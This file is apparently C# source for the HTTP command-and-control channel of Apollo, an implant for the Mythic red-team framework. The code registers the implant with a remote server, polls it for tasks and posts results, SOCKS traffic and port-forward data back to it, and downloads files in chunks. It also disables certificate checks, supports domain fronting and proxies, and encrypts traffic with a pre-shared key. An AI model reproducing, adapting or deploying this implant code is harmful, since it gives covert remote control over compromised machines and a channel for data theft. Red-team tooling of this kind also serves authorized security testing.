#define C2PROFILE_NAME_UPPER

#if DEBUG
#undef HTTP
#define HTTP
#endif


#undef USE_HTTPWEB
#undef USE_WEBCLIENT
//#define USE_WEBCLIENT
#define USE_HTTPWEB

#if HTTP
using System;
using System.Linq;
using System.Text;
using Mythic.C2Profiles;
using Mythic.Crypto;
using Apollo.CommandModules;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System.Diagnostics;
using System.Security.Cryptography;
using System.IO;
using System.Net;
using System.Collections.Generic;
using Mythic.Structs;
using Apollo.MessageInbox;
using static Utils.DebugUtils;
using Apollo.Tasks;
using System.Drawing.Printing;
using Mythic;
using Mythic.Encryption;

namespace Mythic.C2Profiles
{

    /// <summary>
    /// This is the default profile implemented by the Apfell server. This is a simple
    /// HTTPS egress communications profile that has a hard-coded endpoint specified by
    /// the Endpoint attribute. This string is stamped in by the Apfell server (ideally)
    /// at generation, but it's not too hard to implement as a constructor should that
    /// need arise.
    /// </summary>
    class DefaultProfile : ReverseConnectC2Profile
    {
#if DEBUG

        private const string sCallbackInterval = "5";
        private const string sCallbackJitter = "0";
        private const string sCallbackPort = "80";
        private const string sEncryptedExchangeCheck = "T";
        private const string sProxyHost = "";
        private const string sProxyUser = "";
        private const string sProxyPass = "";
#else
        private const string sCallbackInterval = "callback_interval";
        private const string sCallbackJitter = "callback_jitter";
        private const string sCallbackPort = "callback_port";
        private const string sEncryptedExchangeCheck = "encrypted_exchange_check";
        private const string sProxyHost = "proxy_host:proxy_port";
        private const string sProxyUser = "proxy_user";
        private const string sProxyPass = "proxy_pass";
#endif
        private const string DomainFront = "domain_front";
        private const string TerminateDate = "killdate";
        private const string UserAgent = "USER_AGENT";

        private int CallbackPort;
        private bool EncryptedExchangeCheck;

        List<SocksDatagram> finalSocksDatagrams = new List<SocksDatagram>();

        //public static DefaultEncryption cryptor;
#if USE_WEBCLIENT
        private static WebClient client;
#endif
#if DEBUG
        private string Endpoint = "http://mythic/api/v1.4/agent_message";
#else
        private string Endpoint = "callback_host:callback_port/post_uri";
#endif
        // Almost certainly need to pass arguments here to deal with proxy nonsense.
        /// <summary>
        /// Default constructor that will implement the default PSK encryption routine
        /// given by the Apfell server at payload compile time. The UUID and PSK are set
        /// by the server in the Globals.cs file. In the future, this constructor may want
        /// to take variable arguments such as:
        /// - Endpoint
        /// - Headers
        /// - etc.
        /// </summary>
        public DefaultProfile(string uuid = "UUID_HERE", string psk = "AESPSK")
        {
            CallbackInterval = int.Parse(sCallbackInterval) * 1000;
            CallbackJitter = int.Parse(sCallbackJitter);
            CallbackPort = int.Parse(sCallbackPort);
            EncryptedExchangeCheck = sEncryptedExchangeCheck == "T";
            base.cryptor = new PSKCrypto(uuid, psk);
            // Necessary to disable certificate validation
            ServicePointManager.ServerCertificateValidationCallback =
                delegate { return true; };
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072 | SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls;
#if USE_WEBCLIENT
            client = new WebClient();
            client.Proxy = null;
#endif
            WebRequest.DefaultWebProxy = null;
            if (!string.IsNullOrEmpty(sProxyHost) && 
                !string.IsNullOrEmpty(sProxyUser) &&
                !string.IsNullOrEmpty(sProxyPass) &&
                sProxyHost != ":")
            {
                try
                {
                    Uri host;
                    if (sProxyHost.EndsWith(":"))
                        host = new Uri(sProxyHost.Substring(0, sProxyHost.Length - 1));
                    else
                        host = new Uri(sProxyHost);
                    ICredentials creds = new NetworkCredential(sProxyUser, sProxyPass);
                    WebRequest.DefaultWebProxy = new WebProxy(host, true, null, creds);
                } catch (Exception ex)
                {
                    WebRequest.DefaultWebProxy = null;
                }
            }
        }

        

        // Encrypt and post a string to the Apfell server
        /// <summary>
        /// Send a POST request to the Apfell server given a JSON message
        /// and return the JSON string as the result.
        /// </summary>
        /// <param name="message">JSON message string to send.</param>
        /// <returns>JSON string of the server result.</returns>
        public override bool Send(string id, string message)
        {
            Stopwatch sw = new Stopwatch();
            sw.Start();
            byte[] reqPayload = Encoding.UTF8.GetBytes(base.cryptor.Encrypt(message));
            //DebugWriteLine($"Waiting for egress mutex handle...");
#if USE_WEBCLIENT
            egressMtx.WaitOne();
            sw.Stop();
            DebugWriteLine($"Took {Utils.StringUtils.FormatTimespan(sw.Elapsed)} to acquire mutex.");
            sw.Start();
#endif
            //DebugWriteLine($"Acquired egress mutex handle!");
            string result;
            int busyCount = 0;
            while (true)
            {
                try
                {
#if USE_HTTPWEB
       		    HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create(Endpoint);
                    request.KeepAlive = false;
                    request.Method = "Post";
                    request.ContentType = "text/plain";
                    request.ContentLength = reqPayload.Length;
                    request.UserAgent = UserAgent;
                    if (DomainFront != "" && DomainFront != "domain_front")
                        request.Host = DomainFront;
                    Stream reqStream = request.GetRequestStream();
                    reqStream.Write(reqPayload, 0, reqPayload.Length);
                    reqStream.Close();

                    WebResponse response = request.GetResponse();
                    sw.Stop();
                    DebugWriteLine($"Took {Utils.StringUtils.FormatTimespan(sw.Elapsed)} to get response.");
		    using (StreamReader reader = new StreamReader(response.GetResponseStream()))
                    {
                        result = base.cryptor.Decrypt(reader.ReadToEnd());
                    }
                    sw.Restart();
                    Inbox.AddMessage(id, result);
                    sw.Stop();
                    DebugWriteLine($"Took {Utils.StringUtils.FormatTimespan(sw.Elapsed)} to add message to inbox.");
                    break;
#endif
#if USE_WEBCLIENT
                    if (!client.IsBusy)
                    {
                        sw.Stop();
                        DebugWriteLine($"Took {Utils.StringUtils.FormatTimespan(sw.Elapsed)} to acquire mutex and client was busy {busyCount} times.");
                        sw.Restart();
                        //DebugWriteLine("Attempting to send web request...");
                        var middle = Encoding.UTF8.GetString(client.UploadData(Endpoint, reqPayload));
                        sw.Stop();
                        DebugWriteLine($"Took {Utils.StringUtils.FormatTimespan(sw.Elapsed)} for client to upload data.");
                        sw.Restart();
                        result = base.cryptor.Decrypt(middle);
                        sw.Stop();
                        DebugWriteLine($"Took {Utils.StringUtils.FormatTimespan(sw.Elapsed)} to decrypt response.");
                        sw.Restart();
                        Inbox.AddMessage(id, result);
                        sw.Stop();
                        DebugWriteLine($"Took {Utils.StringUtils.FormatTimespan(sw.Elapsed)} to add message to Inbox.");
                        break;
                    }
                    else
                    {
                        busyCount++;
                    }
#endif
                }
                catch (WebException ex)
                {
                    if (ex.Response != null)
                    {
                        var stream = ex.Response.GetResponseStream();
                        if (stream != null)
                        {
                            using (StreamReader responseStream = new StreamReader(stream))
                            {
                                DebugWriteLine($"ERROR! WebException occurred sending message. Reason: {ex.Message}\n\tResponse: {responseStream.ReadToEnd()}");
                                // Process the stream
                            }
                        }
                        else
                        {
                            DebugWriteLine("Honestly just forget it.");
                        }
                    }
                    else
                    {
                        DebugWriteLine($"WebException: {ex.Message}\n\tStackTrace:{ex.StackTrace}");
                    }
                }
                catch (Exception ex)
                {
	            DebugWriteLine($"Error sending message. Reason: {ex.Message}\n\tStackTrace:{ex.StackTrace}");
#if USE_WEBCLIENT
                    egressMtx.ReleaseMutex();
#endif
                    throw ex;
                }
            }
            //DebugWriteLine("Releasing egress mutex handle...");
#if USE_WEBCLIENT
            egressMtx.ReleaseMutex();
#endif
            return true;
        }

        /// <summary>
        /// Serialize an arbitrary task response message
        /// and send it to the Apfell server. Return the
        /// JSON string if successful, otherwise return the
        /// error message or null.
        /// </summary>
        /// <param name="taskresp">Arbitrary object to send in the responses variable.</param>
        /// <returns>Result string</returns>
        override public string SendResponse(string id, Apollo.Tasks.ApolloTaskResponse taskresp)
        {
            try // Try block for HTTP requests
            {
                // Encrypt json to send to server
                Mythic.Structs.TaskResponse apfellResponse = new Mythic.Structs.TaskResponse
                {
                    action = "post_response",
                    responses = new Apollo.Tasks.ApolloTaskResponse[] { taskresp },
                    delegates = new Dictionary<string, string>[] { },
                };
                //Dictionary<string, string>[] delegateMessages = new Dictionary<string, string>[] { };
                if (DelegateMessageRequestQueue.Count > 0)
                {
                    DelegateMessageRequestMutex.WaitOne();
                    apfellResponse.delegates = DelegateMessageRequestQueue.ToArray();
                    DelegateMessageRequestQueue.Clear();
                    DelegateMessageRequestMutex.ReleaseMutex();
                }
                string json = JsonConvert.SerializeObject(apfellResponse);
                //string id = Guid.NewGuid().ToString();
                if (Send(id, json))
                {
                    string result = (string)Inbox.GetMessage(id);
                    if (result.Contains("success"))
                        // If it was successful, return the result
                        return result;
                }
                //Debug.WriteLine($"[-] PostResponse - Got response for task {taskresp.task}: {result}");
                //throw (new Exception($"POST Task Response {taskresp.task} Failed"));
            }
            catch (Exception e) // Catch exceptions from HTTP request or retry exceeded
            {
                return e.Message;
            }
            return "";
        }

        override public string SendResponses(string id, Apollo.Tasks.ApolloTaskResponse[] resps, SocksDatagram[] datagrams=null,PortFwdDatagram[] rdatagrams=null)
        {
            try // Try block for HTTP requests
            {
                // Encrypt json to send to server
                /*
             * //Utils.DebugUtils.DebugWriteLine("Attempting to get all messages from Queue...");
                SocksDatagram[] datagrams = Apollo.SocksProxy.SocksController.GetMythicMessagesFromQueue();
                //Utils.DebugUtils.DebugWriteLine("Got all messages from Queue!");
                bool bRet = false;
                if (datagrams.Length == 0)
                {
                    return true;
                }
                try // Try block for HTTP requests
                {
                    // Encrypt json to send to server
                    string msgId = $"{Guid.NewGuid().ToString()}";
                    Mythic.Structs.TaskResponse apfellResponse = new Mythic.Structs.TaskResponse
                    {
                        action = "post_response",
                        responses = new Apollo.Tasks.ApolloTaskResponse[] { },
                        delegates = new Dictionary<string, string>[] { },
                        socks = datagrams,
                        message_id = msgId
                    };
                    string json = JsonConvert.SerializeObject(apfellResponse);
                    if (Send(msgId, json))
                    {
                        string result = (string)Inbox.GetMessage(msgId);
                        //Utils.DebugUtils.DebugWriteLine("Got the response to sending datagrams!");
                        bRet = true;
                        //if (result.Contains("success"))
                        //    // If it was successful, return the result
                        //    bRet = true;
                    }
                    //Debug.WriteLine($"[-] PostResponse - Got response for task {taskresp.task}: {result}");
                    //throw (new Exception($"POST Task Response {taskresp.task} Failed"));
                }
                catch (Exception e) // Catch exceptions from HTTP request or retry exceeded
                {
                    bRet = false;
                }
                return bRet;*/

                Mythic.Structs.TaskResponse apfellResponse = new Mythic.Structs.TaskResponse
                {
                    action = "post_response",
                    responses = resps,
                    delegates = new Dictionary<string, string>[] { },
                    socks = datagrams,
                    rportfwds = rdatagrams,
                };
                if (DelegateMessageRequestQueue.Count > 0)
                {
                    lock (DelegateMessageRequestQueue)
                    {
                        apfellResponse.delegates = DelegateMessageRequestQueue.ToArray();
                        DelegateMessageRequestQueue.Clear();
                    }
                }
                string json = JsonConvert.SerializeObject(apfellResponse);
                //string id = Guid.NewGuid().ToString();
                if (Send(id, json))
                {
                    string result = (string)Inbox.GetMessage(id);
                    if (result.Contains("success"))
                        // If it was successful, return the result
                        return result;
                }
                //Debug.WriteLine($"[-] PostResponse - Got response for task {taskresp.task}: {result}");
                //throw (new Exception($"POST Task Response {taskresp.task} Failed"));
            }
            catch (Exception e) // Catch exceptions from HTTP request or retry exceeded
            {
                return e.Message;
            }
            return "";
        }



        /// <summary>
        /// Register the agent with the Apfell server.
        /// </summary>
        /// <param name="agent">The agent to register with the server.</param>
        /// <returns>UUID of the newly registered agent.</returns>
        override public string RegisterAgent(Apollo.Agent agent)
        {
            // Get JSON string for implant
            DebugWriteLine("Attempting to serialize agent...");
            string json = JsonConvert.SerializeObject(agent);
            DebugWriteLine($"[+] InitializeImplant - Sending {json}");
            string id = Guid.NewGuid().ToString();
            if (Send(id, json))
            {
                DebugWriteLine("Successfuly sent registration message!");
                string result = (string)Inbox.GetMessage(id);
                if (result.Contains("success"))
                {
                    // If it was successful, initialize implant
                    // Response is { "status": "success", "id": <id> }
                    JObject resultJSON = (JObject)JsonConvert.DeserializeObject(result);
                    string newUUID = resultJSON.Value<string>("id");
                    cryptor.UpdateUUID(newUUID);
                    return newUUID;
                }
                else
                {
                    throw (new Exception("Failed to retrieve an ID for new callback."));
                }
            }
            return "";
        }

        /// <summary>
        /// Check Apfell endpoint for new task
        /// </summary>
        /// <returns>CaramelTask with the next task to execute</returns>
        override public Mythic.Structs.TaskQueue GetMessages(Apollo.Agent agent)
        {

            Stopwatch sw = new Stopwatch();
            sw.Start();
            //DebugWriteLine("Attempting to send SOCKS datagrams...");
            //SendSocksDatagrams();
            sw.Stop();
            DebugWriteLine($"SendSocksDatagrams took {Utils.StringUtils.FormatTimespan(sw.Elapsed)} to run.");
            sw.Restart();

            //DebugWriteLine("Sent all SOCKS datagrams!");
            TaskQueue response = new TaskQueue();
            List<Task> finalTaskList = new List<Task>();
            List<DelegateMessage> finalDelegateMessageList = new List<DelegateMessage>();


	    CheckTaskingRequest req = new CheckTaskingRequest()
            {
                action = "get_tasking",
                tasking_size = -1
            };


            if (DelegateMessageRequestQueue.Count > 0)
            {

                DelegateMessageRequestMutex.WaitOne();
                req.delegates = DelegateMessageRequestQueue.ToArray();
                DelegateMessageRequestQueue.Clear();
                DelegateMessageRequestMutex.ReleaseMutex();
            } else
            {

                req.delegates = new Dictionary<string, string>[] { };
            }

            // Could add delegate post messages
            string json = JsonConvert.SerializeObject(req);

	    string id = Guid.NewGuid().ToString();
            if (Send(id, json))
            {

                string returnMsg = (string)Inbox.GetMessage(id);
		//JObject test = (JObject)JsonConvert.DeserializeObject(returnMsg);
                ////Dictionary<string, object>[] testDictTasks = test.Value<Dictionary<string, object>[]>("tasks");
                //Task[] testTasks = test.Value<Task[]>("tasks");
		Mythic.Structs.CheckTaskingResponse resp = new Mythic.Structs.CheckTaskingResponse();
		resp = JsonConvert.DeserializeObject<Mythic.Structs.CheckTaskingResponse>(returnMsg);

		if (resp.tasks != null)
                {
                    foreach (Task task in resp.tasks)
                    {
                        Debug.WriteLine("[-] CheckTasking - NEW TASK with ID: " + task.id);
                        finalTaskList.Add(task);
                    }
                }
                if (resp.delegates != null)
                {
                    foreach (Dictionary<string, string> delmsg in resp.delegates)
                    {
                        string uuid = delmsg.Keys.First();
                        finalDelegateMessageList.Add(new DelegateMessage()
                        {
                            UUID = uuid,
                            Message = delmsg[uuid]
                        });
                    }
                }
                if (resp.socks != null)
                {
                    response.SocksDatagrams = resp.socks;
                }
                if (resp.rportfwds != null)
                {
                    response.PortFwdDg = new PortFwdDatagram[1];

                    try{
                        response.PortFwdDg[0] = JsonConvert.DeserializeObject<PortFwdDatagram>(resp.rportfwds[0]);
                    }catch(Exception ex){
                        using (StreamWriter writetext = new StreamWriter("C:\\Temp\\logEx.txt", true))
                        {
                            writetext.WriteLine(ex.ToString());
                        }
                    }
		}
            }
	    response.Delegates = finalDelegateMessageList.ToArray();
	    response.Tasks = finalTaskList.ToArray();
	    sw.Stop();
            DebugWriteLine($"Get tasking took {Utils.StringUtils.FormatTimespan(sw.Elapsed)} to run.");
            //SCTask task = JsonConvert.DeserializeObject<SCTask>(Post(json));
	    return response;
        }



        override public byte[] GetFile(UploadFileRegistrationMessage fileReg, int chunk_size)
        {
            string response;
            UploadReply reply;
            reply.total_chunks = 0;
            byte[] data;
            List<byte> fileChunks = new List<byte>();
            int i = 1;
            // Set requisite attributes
            fileReg.action = "upload";
            fileReg.chunk_size = chunk_size;
            //fileReg.chunk_num = i;
            if (fileReg.full_path != "" && fileReg.full_path != null && (fileReg.task_id == "" || fileReg.task_id == null))
                throw new Exception("Full path given but no task_id set. Aborting.");
            try
            {
                do
                {
                    fileReg.chunk_num = i;
                    if (Send(fileReg.task_id, JsonConvert.SerializeObject(fileReg)))
                    {
                        response = (string)Inbox.GetMessage(fileReg.task_id);
                        reply = JsonConvert.DeserializeObject<UploadReply>(response);
                        data = System.Convert.FromBase64String(reply.chunk_data);
                        for (int j = 0; j < data.Length; j++)
                        {
                            fileChunks.Add(data[j]);
                        }
                        i++;
                    }
                } while (i <= reply.total_chunks);
            } catch (Exception ex)
            {
                return null;
            }
            return fileChunks.ToArray();
        }

        /// <summary>
        /// Retrieve a file from the Apfell server and return the bytes of that file.
        /// </summary>
        /// <param name="file_id">ID of the file to pull down.</param>
        /// <param name="implant">Agent or implant that is retrieving this file.</param>
        /// <returns></returns>
        override public byte[] GetFile(string task_id, string file_id, int chunk_size)
        {
            List<byte> fileChunks = new List<byte>();
            try
            {
                Mythic.Structs.UploadFileRegistrationMessage fileReg;
                string response;
                UploadReply reply;
                byte[] data;
                int i = 1;
                do
                {
                    fileReg = new UploadFileRegistrationMessage()
                    {
                        action = "upload",
                        chunk_size = chunk_size,
                        file_id = file_id,
                        full_path = "",
                        chunk_num = i
                    };
                    if (Send(task_id, JsonConvert.SerializeObject(fileReg)))
                    {
                        response = (string)Inbox.GetMessage(task_id);
                        reply = JsonConvert.DeserializeObject<UploadReply>(response);
                        data = System.Convert.FromBase64String(reply.chunk_data);
                        for (int j = 0; j < data.Length; j++)
                        {
                            fileChunks.Add(data[j]);
                        }
                        i++;
                    } else
                    {
                        break;
                    }
                    //response = implant.Profile.Send(JsonConvert.SerializeObject(fileReg));
                    //reply = JsonConvert.DeserializeObject<UploadReply>(response);
                    //data = System.Convert.FromBase64String(reply.chunk_data);
                    //for(int j = 0; j < data.Length; j++)
                    //{
                    //    fileChunks.Add(data[j]);
                    //}
                    //i++;
                } while (i <= reply.total_chunks);
            }
            catch
            {
                return null;
            }
            return fileChunks.ToArray();
        }
    }
}
#endif
